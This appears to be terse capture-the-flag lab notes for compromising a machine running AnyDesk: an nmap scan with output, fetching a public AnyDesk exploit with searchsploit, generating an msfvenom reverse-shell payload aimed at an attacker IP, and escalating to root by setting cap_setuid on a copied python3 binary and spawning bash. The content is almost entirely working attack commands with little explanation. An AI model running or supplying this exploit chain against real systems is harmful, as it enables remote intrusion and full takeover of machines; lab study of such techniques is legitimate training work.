```
nmap -sV -sC -p 22,7070,30365 10.10.107.36 -v -Pn

22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open   ssl/realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Issuer: commonName=AnyDesk Client
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-23T20:04:30
| Not valid after:  2072-03-10T20:04:30
| MD5:   3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0
|_SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b
30365/tcp closed unknown
```

```
searchsploit -m linux/remote/49613.py
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -b "\x00\x25\x26" -f python -v shellcode
#add into script, use default port (50001, its UDP)
```
 
get shell

---
Privesc

<https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/>

```
find / -type f -perm -04000 -ls 2>/dev/null

cd /tmp
whereis python3
cp /usr/bin/python3 .
setcap cap_setuid+ep python3
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
![unnamed_5a694f17832e43829d5de02192eb76b9](unnamed_5a694f17832e43829d5de02192eb76b9.png)
![unnamed_b95e0301d18447b2a7c7853fc3f5c27f](unnamed_b95e0301d18447b2a7c7853fc3f5c27f.png)
![unnamed_6aa7136c11cd4f55894463a5a4bced61](unnamed_6aa7136c11cd4f55894463a5a4bced61.png)